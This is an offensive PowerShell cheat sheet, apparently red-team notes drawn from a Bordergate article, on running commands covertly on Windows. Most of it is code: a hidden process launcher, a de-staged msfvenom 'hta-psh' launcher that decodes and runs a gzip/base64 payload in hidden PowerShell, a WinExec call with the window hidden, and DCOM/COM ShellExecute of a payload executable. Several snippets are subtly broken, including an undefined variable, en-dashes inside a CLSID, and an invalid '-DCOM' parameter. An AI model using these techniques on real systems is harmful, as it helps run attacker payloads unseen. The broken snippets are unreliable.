# Command Execution

## Execute Commands

### Scripting

```powershell
function Execute([string] $command, [string] $arguments) {
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo.FileName = $command
    $process.StartInfo.Arguments = $arguments
	$process.StartInfo.LoadUserProfile = $false
	$process.StartInfo.UseShellExecute = $true
	$process.StartInfo.CreateNoWindow = $true
	$process.StartInfo.WorkingDirectory = (Get-Location).Path

    $process.Start()
    $process.WaitForExit()
}
```

This is a de-staged PowerShell payload inside `hta-psh` in `msfvenom`. The placeholder contains compressed `gzip` with encoded base64 payload which is the final stage of `psh-reflection` payload format.

```powershell
if ([IntPtr]::Size -eq 4) {
    $command = $env:windir + '\sysnative\WindowsPowerShell\v1.0\powershell.exe'
} else {
    $command = 'powershell.exe'
}

$processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
$processStartInfo.FileName = $command
$processStartInfo.Arguments = '-nop -w hidden -c &' +
    '([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream(' +
    '(New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String("<base64_compressed_payload>"))),' +
    '[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'

$processStartInfo.UseShellExecute = $false
$processStartInfo.RedirectStandardOutput = $true
$processStartInfo.WindowStyle = 'Hidden'
$processStartInfo.CreateNoWindow = $true

$process = [System.Diagnostics.Process]::Start($processStartInfo)
```

### WinAPI

```powershell
$WinAPI = @"
 
using System;
using System.Runtime.InteropServices;
 
public class Kernel32 {
[DllImport("kernel32.dll")]
public static extern uint WinExec(string lpCmdLine, uint uCmdShow);
}
"@
 
Add-Type $WinAPI
[uint32]$SHOW_HIDE = 0
[Kernel32]::WinExec("C:\Windows\System32\calc.exe", $SHOW_HIDE)
```

## Run As Administrator

### DCOM Object

```powershell
$execute = New-Object -DCOM Shell.Application
$execute.ShellExecute("$Env:USERPROFILE\payload.exe")
```

Another variant using **ShellWindows COM**.

```powershell
$com = [Type]::GetTypeFromCLSID("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}")
$obj = [System.Activator]::CreateInstance($com)
$item.Document.Application.ShellExecute("notepad.exe", "", "", $null, 0)
```

ShellBrowserWindow.

```powershell
$browser = [activator]::CreateInstance([Type]::GetTypeFromCLSID("C08AFD90-F2A1–11D1–8455–00A0C91F3880"))
$browser.Document.Application.ShellExecute("notepad.exe")
```

---
## References

### Bordergate

- [Bordergate: Offensive PowerShell](https://www.bordergate.co.uk/offensive-powershell/)